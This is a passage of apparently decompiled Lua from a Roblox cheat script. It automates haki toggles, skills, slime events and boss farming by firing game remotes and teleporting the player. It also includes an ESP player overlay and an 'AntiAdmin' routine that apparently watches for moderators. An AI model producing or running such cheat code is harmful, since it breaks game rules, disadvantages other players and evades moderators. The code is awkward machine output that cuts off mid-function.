            environment.task.spawn(functions.handleNewAtLine22(environment, capturedCallback9))
        end
        return
    end, closureEnvironment)
end

function functions.handleNewAtLine22(closureEnvironment, capturedCallback9)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local callResults, value
        value = capturedCallback9
        callResults = runtime.pack(environment.Vector3.new(651.810181, -3.67419362, -1021.13123))
        value(runtime.unpack(callResults, 1, (((callResults.n + 2) - 1) - 1)))
        return
    end, closureEnvironment)
end

function functions.handleFindFirstChildAtLine40(
    closureEnvironment,
    capturedOptions,
    capturedItems17,
    capturedReplicatedStorage
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local remoteEvents, remoteEvents2, remoteEvents3, value
        if
            not (
                ((not capturedOptions.AutoHaki) or not capturedOptions.AutoHaki.Value)
                or capturedItems17.Active
            )
        then
            value = capturedReplicatedStorage
            remoteEvents = value.FindFirstChild(value, "RemoteEvents")
            if remoteEvents then
                remoteEvents2 = capturedReplicatedStorage.RemoteEvents
                remoteEvents = remoteEvents2.FindFirstChild(remoteEvents2, "HakiRemote")
            end
            if remoteEvents then
                remoteEvents3 = remoteEvents
                remoteEvents3.FireServer(remoteEvents3, "Toggle")
            end
        end
        return
    end, closureEnvironment)
end

function functions.handlePcallAtLine123(
    closureEnvironment,
    capturedOptions,
    capturedReplicatedStorage,
    capturedItems18
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        while true do
            if environment.task.wait(0.5) then
                if
                    not (
                        not capturedOptions
                        or (
                            not capturedOptions.AutoObservationHaki
                            or not capturedOptions.AutoObservationHaki.Value
                        )
                    )
                then
                    environment.pcall(
                        functions.handleFindFirstChildAtLine28(
                            environment,
                            capturedReplicatedStorage,
                            capturedItems18
                        )
                    )
                end
                continue
            end
            break
        end
        return
    end, closureEnvironment)
end

function functions.handleFindFirstChildAtLine28(
    closureEnvironment,
    capturedReplicatedStorage,
    capturedItems18
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local observationHakiRemote, observationHakiRemote2, remoteEvents, value
        value = capturedReplicatedStorage
        observationHakiRemote2 = value.FindFirstChild(value, "RemoteEvents")
        if observationHakiRemote2 then
            remoteEvents = capturedReplicatedStorage.RemoteEvents
            observationHakiRemote2 = remoteEvents.FindFirstChild(remoteEvents, "ObservationHakiRemote")
        end
        if not ((not observationHakiRemote2) or capturedItems18.Active) then
            observationHakiRemote = observationHakiRemote2
            observationHakiRemote.FireServer(observationHakiRemote, "Toggle")
        end
        return
    end, closureEnvironment)
end

function functions.handlePcallAtLine97(closureEnvironment, capturedOptions)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        while true do
            if environment.task.wait(1) then
                if
                    not (
                        not capturedOptions.AutoConquerorHaki or not capturedOptions.AutoConquerorHaki.Value
                    )
                then
                    environment.pcall(functions.handleUnpack(environment))
                end
                continue
            end
            break
        end
        return
    end, closureEnvironment)
end

function functions.handleUnpack(closureEnvironment)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local callResults, conquerorHakiRemote, conquerorHakiRemote2, fireServer, gameValue, items, value, value2
        items = runtime.create(1)
        runtime.move({ "Activate" }, 1, 1, 1, items)
        gameValue = environment.game
        value = (gameValue.GetService(gameValue, "ReplicatedStorage"))
        value2 = (value.WaitForChild(value, "Remotes"))
        conquerorHakiRemote = value2.FindFirstChild(value2, "ConquerorHakiRemote")
        if conquerorHakiRemote then
            conquerorHakiRemote2 = conquerorHakiRemote
            fireServer = conquerorHakiRemote2.FireServer
            callResults = runtime.pack(environment.unpack(items))
            fireServer(conquerorHakiRemote2, runtime.unpack(callResults, 1, (((callResults.n + 5) - 1) - 4)))
        end
        return
    end, closureEnvironment)
end

function functions.handleWaitAtLine117(
    closureEnvironment,
    capturedOptions,
    capturedItems43,
    capturedSharedValueState7
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local items
        items = runtime.create(5)
        runtime.move({ "Z", "X", "C", "V", "F" }, 1, 5, 1, items)
        while true do
            environment.task.wait(0.1)
            if
                ((not capturedOptions.AutoSkill) or not capturedOptions.AutoSkill.Value)
                or not (((environment.tick()) - environment._G.LastActiveAttack) < 1.5)
            then
                environment.task.wait(0.5)
            else
                environment.pcall(
                    functions.handleTickAtLine97(
                        environment,
                        capturedOptions,
                        items,
                        capturedItems43,
                        capturedSharedValueState7
                    )
                )
            end
            continue
        end
    end, closureEnvironment)
end

function functions.handleTickAtLine97(
    closureEnvironment,
    capturedOptions,
    capturedItems,
    capturedItems43,
    capturedSharedValueState7
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local callResults, callResults2, hasNext, iterationCursor, iterationCursor2, iterationLimit, iterationStep, iteratorKey, iteratorValue, iteratorValue2, result, savedIterations
        local savedIterations2, value, value2, value3
        value2 = capturedOptions.SelectSkills
        if value2 then
            value2 = capturedOptions.SelectSkills.Value
        end
        if not value2 then
            value2 = {}
        end
        callResults = runtime.pack(environment.ipairs(capturedItems))
        callResults2 = callResults
        savedIterations2 = { nil, [5] = nil, nil, nil }
        result = runtime.wrapIterator(runtime.iteratorBody1)
        result(callResults2[1], callResults2[2], callResults2[3])
        iteratorValue2 = nil
        iterationCursor2 = result
        while true do
            hasNext, iteratorKey, iteratorValue = iterationCursor2()
            if not hasNext then
            else
                iteratorValue2 = iteratorValue
            end
            if
                not (
                    not hasNext
                    or (
                        not capturedOptions.AutoSkill.Value
                        or (1.5 < ((environment.tick()) - environment._G.LastActiveAttack))
                    )
                )
            then
                if value2[iteratorValue2] then
                    value = capturedItems43[iteratorValue2]
                    if not ((not capturedSharedValueState7.value) or not value) then
                        value3 = capturedSharedValueState7.value
                        value3.FireServer(value3, value)
                        environment.task.wait(0.2)
                    end
                end
                continue
            end
            break
        end
        iterationCursor = savedIterations2[3]
        iterationLimit = savedIterations2[2]
        iterationStep = savedIterations2[5]
        savedIterations = savedIterations2[1]
        return
    end, closureEnvironment)
end

function functions.handleSpawn7(
    closureEnvironment,
    capturedOptions,
    capturedCallback9,
    capturedNewResult,
    capturedCallback10,
    capturedCallback11,
    capturedItems46
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local argument1 = ...
        if argument1 then
            environment.task.spawn(
                functions.handleWaitAtLine14(
                    environment,
                    capturedOptions,
                    capturedCallback9,
                    capturedNewResult,
                    capturedCallback10,
                    capturedCallback11,
                    capturedItems46
                )
            )
        end
        return
    end, closureEnvironment)
end

function functions.handleWaitAtLine14(
    closureEnvironment,
    capturedOptions,
    capturedCallback9,
    capturedNewResult,
    capturedCallback10,
    capturedCallback11,
    capturedItems46
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        while true do
            if
                not (
                    ((not capturedOptions) or not capturedOptions.AutoSlimeEvent)
                    or not capturedOptions.AutoSlimeEvent.Value
                )
            then
                if not environment._G.IsPortaling then
                    environment.pcall(
                        functions.handleWait3(
                            environment,
                            capturedCallback9,
                            capturedNewResult,
                            capturedOptions,
                            capturedCallback10,
                            capturedCallback11,
                            capturedItems46
                        )
                    )
                else
                    environment.task.wait(1)
                end
                environment.task.wait(1)
                continue
            end
            break
        end
        return
    end, closureEnvironment)
end

function functions.handleWait3(
    closureEnvironment,
    capturedCallback9,
    capturedNewResult,
    capturedOptions,
    capturedCallback10,
    capturedCallback11,
    capturedItems46
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local gameValue, iterationCursor, iterationCursor2, iterationCursor3, iterationCursor4, iterationCursor5, iterationCursor6, iterationLimit, iterationLimit2, iterationLimit3, iterationLimit4, iterationLimit5
        local iterationStep, iterationStep2, iterationStep3, iterationStep4, iterationStep5, matches, matches2, matches3, savedIterations, savedIterations2, savedIterations3, savedIterations4
        local savedIterations5, value, value2, value3, value4, value5
        capturedCallback9(capturedNewResult.Position)
        environment.task.wait(1.5)
        if not capturedOptions.AutoSlimeEvent.Value then
            return
        else
            capturedCallback10(capturedNewResult, 15, capturedOptions.AutoSlimeEvent)
            if not capturedOptions.AutoSlimeEvent.Value then
                return
            else
                savedIterations4 = { nil, [5] = nil, nil, nil }
                iterationStep4 = (1 + 0)
                iterationLimit4 = (3 + 0)
                iterationCursor3 = (1 - iterationStep4)
                while true do
                    iterationCursor3 = (iterationCursor3 + iterationStep4)
                    if iterationStep4 <= 0 then
                        matches2 = (iterationCursor3 >= iterationLimit4)
                    else
                        matches2 = (iterationCursor3 <= iterationLimit4)
                    end
                    if matches2 then
                        if not capturedOptions.AutoSlimeEvent.Value then
                            return
                        else
                            capturedCallback11()
                            environment.task.wait(0.5)
                            continue
                        end
                    end
                    break
                end
                iterationCursor4 = savedIterations4[3]
                iterationLimit2 = savedIterations4[2]
                iterationStep2 = savedIterations4[5]
                savedIterations2 = savedIterations4[1]
                gameValue = environment.game
                value = (gameValue.GetService(gameValue, "ReplicatedStorage"))
                value2 = (value.WaitForChild(value, "Remotes"))
                value3 = (value2.WaitForChild(value2, "EventRemotes"))
                value4 = (value3.WaitForChild(value3, "GetEvents"))
                value4.InvokeServer(value4)
                environment.task.wait(1)
                iterationCursor = nil
                savedIterations3 =
                    { savedIterations2, [5] = iterationStep2, iterationLimit2, iterationCursor4 }
                iterationStep3 = (1 + 0)
                iterationLimit3 = (7 + 0)
                iterationCursor6 = (1 - iterationStep3)
                while true do
                    iterationCursor6 = (iterationCursor6 + iterationStep3)
                    if iterationStep3 <= 0 then
                        matches = (iterationCursor6 >= iterationLimit3)
                    else
                        matches = (iterationCursor6 <= iterationLimit3)
                    end
                    if matches then
                        iterationCursor = iterationCursor6
                    end
                    if
                        (matches and capturedOptions.AutoSlimeEvent.Value) and not environment._G.IsPortaling
                    then
                        value5 = capturedItems46[("Slime #" .. iterationCursor)]
                        if not value5 then
                            continue
                        else
                            capturedCallback9(value5.Position)
                            environment.task.wait(1.5)
                            if not capturedOptions.AutoSlimeEvent.Value then
                                return
                            else
                                capturedCallback10(value5, 15, capturedOptions.AutoSlimeEvent)
                                if not capturedOptions.AutoSlimeEvent.Value then
                                    return
                                else
                                    savedIterations = {
                                        savedIterations3,
                                        [5] = iterationStep3,
                                        iterationLimit3,
                                        iterationCursor6,
                                    }
                                    iterationStep = (1 + 0)
                                    iterationLimit = (5 + 0)
                                    iterationCursor2 = (1 - iterationStep)
                                    while true do
                                        iterationCursor2 = (iterationCursor2 + iterationStep)
                                        if iterationStep <= 0 then
                                            matches3 = (iterationCursor2 >= iterationLimit)
                                        else
                                            matches3 = (iterationCursor2 <= iterationLimit)
                                        end
                                        if matches3 then
                                            if not capturedOptions.AutoSlimeEvent.Value then
                                                return
                                            else
                                                capturedCallback11()
                                                environment.task.wait(0.3)
                                                continue
                                            end
                                        end
                                        break
                                    end
                                    iterationCursor6 = savedIterations[3]
                                    iterationLimit3 = savedIterations[2]
                                    iterationStep3 = savedIterations[5]
                                    savedIterations3 = savedIterations[1]
                                    continue
                                end
                            end
                        end
                    end
                    break
                end
                iterationCursor5 = savedIterations3[3]
                iterationLimit5 = savedIterations3[2]
                iterationStep5 = savedIterations3[5]
                savedIterations5 = savedIterations3[1]
                return
            end
        end
    end, closureEnvironment)
end

function functions.valuesAtLine1(closureEnvironment, capturedBossState2)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local argument1 = ...
        capturedBossState2.value = argument1
        return
    end, closureEnvironment)
end

function functions.handleFindAtLine1(closureEnvironment, capturedItems22)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local argument1 = ...
        local argument12, callResults, callResults2, callResults3, callResults4, globalChatAlert, globalChatAlert2, hasNext, hasNext2, iterationCursor, iterationCursor2, iterationCursor3
        local iterationCursor4, iterationLimit, iterationLimit2, iterationStep, iterationStep2, iteratorKey, iteratorKey2, iteratorKey3, iteratorKey4, iteratorValue, iteratorValue2, iteratorValue3
        local iteratorValue4, result, result2, savedIterations, savedIterations2, savedIterations3, savedIterations4
        argument12 = argument1
        if not argument12 then
            return
        else
            if not (environment.string.find(argument12, "has spawned")) then
                if environment.string.find(argument12, "has been defeated") then
                    callResults = runtime.pack(environment.pairs(capturedItems22))
                    callResults2 = callResults
                    savedIterations2 = { nil, [5] = nil, nil, nil }
                    result = runtime.wrapIterator(runtime.iteratorBody1)
                    result(callResults2[1], callResults2[2], callResults2[3])
                    iteratorKey4 = nil
                    iteratorValue4 = nil
                    iterationCursor2 = result
                    while true do
                        hasNext2, iteratorKey3, iteratorValue3 = iterationCursor2()
                        if not hasNext2 then
                        else
                            iteratorKey4 = iteratorKey3
                            iteratorValue4 = iteratorValue3
                        end
                        if hasNext2 then
                            if environment.string.find(argument12, iteratorKey4) then
                                globalChatAlert2 = environment._G.GlobalChatAlert
                                globalChatAlert2[iteratorValue4] = false
                            end
                            continue
                        end
                        break
                    end
                    iterationCursor = savedIterations2[3]
                    iterationLimit = savedIterations2[2]
                    iterationStep = savedIterations2[5]
                    savedIterations = savedIterations2[1]
                end
            else
                callResults3 = runtime.pack(environment.pairs(capturedItems22))
                callResults4 = callResults3
                savedIterations4 = { nil, [5] = nil, nil, nil }
                result2 = runtime.wrapIterator(runtime.iteratorBody1)
                result2(callResults4[1], callResults4[2], callResults4[3])
                iteratorKey2 = nil
                iteratorValue2 = nil
                iterationCursor4 = result2
                while true do
                    hasNext, iteratorKey, iteratorValue = iterationCursor4()
                    if not hasNext then
                    else
                        iteratorKey2 = iteratorKey
                        iteratorValue2 = iteratorValue
                    end
                    if hasNext then
                        if environment.string.find(argument12, iteratorKey2) then
                            globalChatAlert = environment._G.GlobalChatAlert
                            globalChatAlert[iteratorValue2] = true
                        end
                        continue
                    end
                    break
                end
                iterationCursor3 = savedIterations4[3]
                iterationLimit2 = savedIterations4[2]
                iterationStep2 = savedIterations4[5]
                savedIterations3 = savedIterations4[1]
            end
            return
        end
    end, closureEnvironment)
end

function functions.handlePcallAtLine87(closureEnvironment, capturedCallback)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        environment.pcall(functions.handleGetServiceAtLine30(environment, capturedCallback))
        environment.pcall(functions.handleWaitForChild2(environment, capturedCallback))
        environment.pcall(functions.handleGetServiceAtLine62(environment))
        return
    end, closureEnvironment)
end

function functions.handleGetServiceAtLine62(closureEnvironment)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local bossTimerSync, gameValue, onClientEvent, value, waitForChildResult, waitForChildResult2
        gameValue = environment.game
        value = (gameValue.GetService(gameValue, "ReplicatedStorage"))
        waitForChildResult = value.WaitForChild(value, "Remotes", 5)
        if waitForChildResult then
            waitForChildResult2 = waitForChildResult
            bossTimerSync = waitForChildResult2.FindFirstChild(waitForChildResult2, "BossTimerSync")
            if bossTimerSync then
                onClientEvent = bossTimerSync.OnClientEvent
                onClientEvent.Connect(onClientEvent, functions.handlePairsAtLine1(environment))
            end
        end
        return
    end, closureEnvironment)
end

function functions.handlePairsAtLine1(closureEnvironment)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local argument1 = ...
        local argument12, callResults, callResults2, globalBossStates, globalBossStates2, hasNext, iterationCursor, iterationCursor2, iterationLimit, iterationStep, iteratorKey, iteratorKey2
        local iteratorValue, iteratorValue2, result, savedIterations, savedIterations2
        argument12 = argument1
        if (environment["type"](argument12)) == "table" then
            callResults = runtime.pack(environment.pairs(argument12))
            callResults2 = callResults
            savedIterations = { nil, [5] = nil, nil, nil }
            result = runtime.wrapIterator(runtime.iteratorBody1)
            result(callResults2[1], callResults2[2], callResults2[3])
            iteratorKey2 = nil
            iteratorValue2 = nil
            iterationCursor = result
            while true do
                hasNext, iteratorKey, iteratorValue = iterationCursor()
                if not hasNext then
                else
                    iteratorKey2 = iteratorKey
                    iteratorValue2 = iteratorValue
                end
                if hasNext then
                    if
                        not iteratorValue2.isAlive
                        and ((not iteratorValue2.timer) or not (iteratorValue2.timer <= 0))
                    then
                        globalBossStates = environment._G.GlobalBossStates
                        globalBossStates[iteratorKey2] = false
                    else
                        globalBossStates2 = environment._G.GlobalBossStates
                        globalBossStates2[iteratorKey2] = true
                    end
                    continue
                end
                break
            end
            iterationCursor2 = savedIterations[3]
            iterationLimit = savedIterations[2]
            iterationStep = savedIterations[5]
            savedIterations2 = savedIterations[1]
        end
        return
    end, closureEnvironment)
end

function functions.handleGetServiceAtLine30(closureEnvironment, capturedCallback)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local gameValue, messageReceived
        gameValue = environment.game
        messageReceived = (gameValue.GetService(gameValue, "TextChatService")).MessageReceived
        messageReceived.Connect(messageReceived, functions.handleCallback21(environment, capturedCallback))
        return
    end, closureEnvironment)
end

function functions.handleCallback21(closureEnvironment, capturedCallback)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local argument1 = ...
        capturedCallback(argument1.Text)
        return
    end, closureEnvironment)
end

function functions.handleWaitForChild2(closureEnvironment, capturedCallback)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local gameValue, onClientEvent, value, value2
        gameValue = environment.game
        value = (gameValue.GetService(gameValue, "ReplicatedStorage"))
        value2 = (value.WaitForChild(value, "DefaultChatSystemChatEvents"))
        onClientEvent = (value2.WaitForChild(value2, "OnMessageDoneFiltering")).OnClientEvent
        onClientEvent.Connect(onClientEvent, functions.handleCallback22(environment, capturedCallback))
        return
    end, closureEnvironment)
end

function functions.handleCallback22(closureEnvironment, capturedCallback)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local argument1 = ...
        capturedCallback(argument1.Message)
        return
    end, closureEnvironment)
end

function functions.handleFindFirstChild6(closureEnvironment)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local argument1 = ...
        local argument12, callResults, callResults2, callResults3, callResults4, callResults5, callResults6, enemies, find, hasNext, hasNext2, humanoid
        local humanoidRootPart, ipairsValue, items, items2, iterationCursor, iterationCursor2, iterationCursor3, iterationLimit, iterationLimit2, iterationStep, iterationStep2, iteratorKey
        local iteratorKey2, iteratorValue, iteratorValue2, iteratorValue3, iteratorValue4, iteratorValue5, iteratorValue6, iteratorValue7, mobs, nPCs, name, result
        local result2, savedIterations, savedIterations2, savedIterations3, workspaceValue, workspaceValue2, workspaceValue3, workspaceValue4, workspaceValue5
        argument12 = argument1
        items = runtime.create(4)
        workspaceValue = environment.workspace
        workspaceValue2 = environment.workspace
        nPCs = workspaceValue2.FindFirstChild(workspaceValue2, "NPCs")
        workspaceValue3 = environment.workspace
        enemies = workspaceValue3.FindFirstChild(workspaceValue3, "Enemies")
        workspaceValue4 = environment.workspace
        mobs = workspaceValue4.FindFirstChild(workspaceValue4, "Mobs")
        workspaceValue5 = environment.workspace
        callResults = runtime.pack(workspaceValue5.FindFirstChild(workspaceValue5, "Npcs"))
        items2 = items
        runtime.move({ workspaceValue, nPCs, enemies, mobs }, 1, 4, 1, items2)
        runtime.move(callResults, 1, (((callResults.n + 7) - 1) - 6), 5, items2)
        callResults2 = runtime.pack(environment.pairs(items))
        callResults3 = callResults2
        savedIterations2 = { nil, [5] = nil, nil, nil }
        result = runtime.wrapIterator(runtime.iteratorBody1)
        result(callResults3[1], callResults3[2], callResults3[3])
        iteratorValue4 = nil
        iterationCursor2 = result
        while true do
            hasNext, iteratorKey, iteratorValue3 = iterationCursor2()
            if not hasNext then
            else
                iteratorValue4 = iteratorValue3
            end
            if hasNext then
                if not iteratorValue4 then
                    continue
                else
                    ipairsValue = environment.ipairs
                    iteratorValue7 = iteratorValue4
                    callResults4 = runtime.pack(iteratorValue7.GetChildren(iteratorValue7))
                    callResults5 = runtime.pack(
                        ipairsValue(runtime.unpack(callResults4, 1, (((callResults4.n + 7) - 1) - 6)))
                    )
                    callResults6 = callResults5
                    savedIterations3 =
                        { savedIterations2, [5] = iterationStep, iterationLimit, iterationCursor2 }
                    result2 = runtime.wrapIterator(runtime.iteratorBody1)
                    result2(callResults6[1], callResults6[2], callResults6[3])
                    iteratorValue6 = nil
                    iterationCursor3 = result2
                    while true do
                        hasNext2, iteratorKey2, iteratorValue5 = iterationCursor3()
                        if not hasNext2 then
                        else
                            iteratorValue6 = iteratorValue5
                        end
                        if hasNext2 then
                            if not (environment.string.find(iteratorValue6.Name, argument12)) then
                                continue
                            else
                                find = environment.string.find
                                name = iteratorValue6.Name
                                if not (find((name.lower(name)), "dummy")) then
                                    iteratorValue = iteratorValue6
                                    humanoid = iteratorValue.FindFirstChildOfClass(iteratorValue, "Humanoid")
                                    iteratorValue2 = iteratorValue6
                                    humanoidRootPart =
                                        iteratorValue2.FindFirstChild(iteratorValue2, "HumanoidRootPart")
                                    if
                                        ((not humanoid) or not humanoidRootPart) or not (0 < humanoid.Health)
                                    then
                                        continue
                                    else
                                        return iteratorValue6
                                    end
                                else
                                    continue
                                end
                            end
                        end
                        break
                    end
                    iterationCursor2 = savedIterations3[3]
                    iterationLimit = savedIterations3[2]
                    iterationStep = savedIterations3[5]
                    savedIterations2 = savedIterations3[1]
                    continue
                end
            end
            break
        end
        iterationCursor = savedIterations2[3]
        iterationLimit2 = savedIterations2[2]
        iterationStep2 = savedIterations2[5]
        savedIterations = savedIterations2[1]
        return nil
    end, closureEnvironment)
end

function functions.handlePcall5(closureEnvironment)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local argument1 = ...
        local aizenBoss, alucardBoss, argument12, gojoBoss, items, jinwooBoss, sukunaBoss, textValueState, value, yamatoBoss, yujiBoss
        textValueState = {}
        argument12 = argument1
        items = {}
        aizenBoss = runtime.create(2)
        textValueState.value = "TimedBossSpawn_AizenBoss_Container"
        runtime.move({ textValueState.value, "TimedBossSpawn_AizenBoss" }, 1, 2, 1, aizenBoss)
        items.AizenBoss = aizenBoss
        alucardBoss = runtime.create(2)
        textValueState.value = "TimedBossSpawn_AlucardBoss_Container"
        runtime.move({ textValueState.value, "TimedBossSpawn_AlucardBoss" }, 1, 2, 1, alucardBoss)
        items.AlucardBoss = alucardBoss
        gojoBoss = runtime.create(2)
        textValueState.value = "TimedBossSpawn_GojoBoss_Container"
        runtime.move({ textValueState.value, "TimedBossSpawn_GojoBoss" }, 1, 2, 1, gojoBoss)
        items.GojoBoss = gojoBoss
        jinwooBoss = runtime.create(2)
        textValueState.value = "TimedBossSpawn_JinwooBoss_Container"
        runtime.move({ textValueState.value, "TimedBossSpawn_JinwooBoss" }, 1, 2, 1, jinwooBoss)
        items.JinwooBoss = jinwooBoss
        sukunaBoss = runtime.create(2)
        textValueState.value = "TimedBossSpawn_SukunaBoss_Container"
        runtime.move({ textValueState.value, "TimedBossSpawn_SukunaBoss" }, 1, 2, 1, sukunaBoss)
        items.SukunaBoss = sukunaBoss
        yamatoBoss = runtime.create(2)
        textValueState.value = "TimedBossSpawn_Yamato_Container"
        runtime.move({ textValueState.value, "TimedBossSpawn_YamatoBoss" }, 1, 2, 1, yamatoBoss)
        items.YamatoBoss = yamatoBoss
        yujiBoss = runtime.create(2)
        textValueState.value = "TimedBossSpawn_YujiBoss_Container"
        runtime.move({ textValueState.value, "TimedBossSpawn_YujiBoss" }, 1, 2, 1, yujiBoss)
        items.YujiBoss = yujiBoss
        value = items[argument12]
        if not value then
            textValueState.value = false
            textValueState = { value = textValueState.value }
            return textValueState.value
        else
            textValueState.value = false
            environment.pcall(
                functions.handleFindFirstChildAtLine15(environment, value, argument12, textValueState)
            )
            return textValueState.value
        end
    end, closureEnvironment)
end

function functions.handleFindFirstChildAtLine15(
    closureEnvironment,
    capturedValue,
    capturedArgument12,
    capturedTextValueState
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local bossTimerBillboard, bossTimerBillboard2, contentText, findFirstChildResult, findFirstChildResult2, findFirstChildResult3, findFirstChildResult4, frame, frame2, gsubResult, text, timer
        local workspaceValue
        workspaceValue = environment.workspace
        findFirstChildResult = workspaceValue.FindFirstChild(workspaceValue, capturedValue[1])
        if findFirstChildResult then
            findFirstChildResult2 = findFirstChildResult
            findFirstChildResult3 =
                findFirstChildResult2.FindFirstChild(findFirstChildResult2, capturedValue[2])
            if findFirstChildResult3 then
                findFirstChildResult4 = findFirstChildResult3
                bossTimerBillboard2 =
                    findFirstChildResult4.FindFirstChild(findFirstChildResult4, "BossTimerBillboard")
                if not ((not bossTimerBillboard2) or (bossTimerBillboard2.Enabled ~= true)) then
                    bossTimerBillboard = bossTimerBillboard2
                    frame = bossTimerBillboard.FindFirstChild(bossTimerBillboard, "Frame")
                    if frame then
                        frame2 = frame
                        timer = frame2.FindFirstChild(frame2, "Timer")
                        if timer then
                            text = timer.Text
                            if not text then
                                text = ""
                            end
                            contentText = timer.ContentText
                            if not contentText then
                                contentText = ""
                            end
                            gsubResult = environment.string.gsub(text, " ", "")
                            if capturedArgument12 == "AlucardBoss" then
                                if
                                    not ((gsubResult == "") or (environment.string.match(gsubResult, "%d")))
                                then
                                    capturedTextValueState.value = true
                                end
                            else
                                if
                                    not (
                                        not (environment.string.find(text, "Spawning..."))
                                        and not (environment.string.find(contentText, "Spawning..."))
                                    )
                                then
                                    capturedTextValueState.value = true
                                end
                            end
                        end
                    end
                end
            end
        end
        return
    end, closureEnvironment)
end

function functions.handleGetPlayers(closureEnvironment, capturedCallback16)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local argument1 = ...
        local antiAdmin, callResults, callResults2, callResults3, gValue, hasNext, ipairsValue, iterationCursor, iterationCursor2, iterationLimit, iterationStep, iteratorKey
        local iteratorValue, iteratorValue2, players, result, savedIterations, savedIterations2
        antiAdmin = argument1
        gValue = environment._G
        gValue.AntiAdmin = antiAdmin
        if antiAdmin then
            ipairsValue = environment.ipairs
            players = environment.game.Players
            callResults = runtime.pack(players.GetPlayers(players))
            callResults2 =
                runtime.pack(ipairsValue(runtime.unpack(callResults, 1, (((callResults.n + 3) - 1) - 2))))
            callResults3 = callResults2
            savedIterations = { nil, [5] = nil, nil, nil }
            result = runtime.wrapIterator(runtime.iteratorBody1)
            result(callResults3[1], callResults3[2], callResults3[3])
            iteratorValue2 = nil
            iterationCursor = result
            while true do
                hasNext, iteratorKey, iteratorValue = iterationCursor()
                if not hasNext then
                else
                    iteratorValue2 = iteratorValue
                end
                if hasNext then
                    capturedCallback16(iteratorValue2)
                    continue
                end
                break
            end
            iterationCursor2 = savedIterations[3]
            iterationLimit = savedIterations[2]
            iterationStep = savedIterations[5]
            savedIterations2 = savedIterations[1]
        end
        return
    end, closureEnvironment)
end

function functions.handleGetPlayersAtLine1(closureEnvironment, capturedCallback, capturedCallback2)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local argument1 = ...
        local callResults, callResults2, callResults3, eSPEnabled, gValue, hasNext, iterationCursor, iterationCursor2, iterationLimit, iterationStep, iteratorKey, iteratorValue
        local iteratorValue2, pairsValue, playerAdded, players, result, savedIterations, savedIterations2
        eSPEnabled = argument1
        gValue = environment._G
        gValue.ESPEnabled = eSPEnabled
        if not eSPEnabled then
            capturedCallback2()
        else
            pairsValue = environment.pairs
            players = environment.game.Players
            callResults = runtime.pack(players.GetPlayers(players))
            callResults2 =
                runtime.pack(pairsValue(runtime.unpack(callResults, 1, (((callResults.n + 3) - 1) - 2))))
            callResults3 = callResults2
            savedIterations = { nil, [5] = nil, nil, nil }
            result = runtime.wrapIterator(runtime.iteratorBody1)
            result(callResults3[1], callResults3[2], callResults3[3])
            iteratorValue2 = nil
            iterationCursor = result
            while true do
                hasNext, iteratorKey, iteratorValue = iterationCursor()
                if not hasNext then
                else
                    iteratorValue2 = iteratorValue
                end
                if hasNext then
                    capturedCallback(iteratorValue2)
                    continue
                end
                break
            end
            iterationCursor2 = savedIterations[3]
            iterationLimit = savedIterations[2]
            iterationStep = savedIterations[5]
            savedIterations2 = savedIterations[1]
            playerAdded = environment.game.Players.PlayerAdded
            playerAdded.Connect(playerAdded, capturedCallback)
        end
        return
    end, closureEnvironment)
end

function functions.handlePcallAtLine57(
    closureEnvironment,
    capturedOptions,
    capturedCallback,
    capturedCallback4,
    capturedItems3,
    capturedLocalPlayer2,
    capturedCallback8,
    capturedCallback13,
    capturedCallback15,
    capturedCallback14
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local currentLockedBoss, gValue, gValue2
        while true do
            environment.task.wait(0.1)
            if (not capturedOptions.AutoBossFarm) or not capturedOptions.AutoBossFarm.Value then
                gValue = environment._G
                gValue.BossIsActive = false
                gValue2 = environment._G
                gValue2.CurrentLockedBoss = currentLockedBoss
            else
                if not environment._G.IsPortaling then
                    environment.pcall(
                        functions.handleLowerAtLine24(
                            environment,
                            capturedOptions,
                            capturedCallback,
                            capturedCallback4,
                            capturedItems3,
                            capturedLocalPlayer2,
                            capturedCallback8,
                            capturedCallback13,
                            capturedCallback15,
                            capturedCallback14
                        )
                    )
                end
            end
            continue
        end
    end, closureEnvironment)
end

function functions.handleLowerAtLine24(
    closureEnvironment,
    capturedOptions,
    capturedCallback,
    capturedCallback4,
    capturedItems3,
    capturedLocalPlayer2,
    capturedCallback8,
    capturedCallback13,
    capturedCallback15,
    capturedCallback14
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local bossWaitTimer, bossWaitTimer2, callResults, callResults2, callResults3, callResults4, callResults5, callResults6, callResults7, callResults8, callResults9, character
        local currentLockedBoss, currentLockedBoss2, currentLockedBoss3, currentLockedBoss4, find, find2, gValue, gValue2, gValue3, gValue4, gValue5, gValue6
        local gValue7, gValue8, globalBossStates, globalBossStates2, globalChatAlert, globalChatAlert2, hasNext, hasNext2, hasNext3, humanoid, humanoidRootPart, iterationCursor
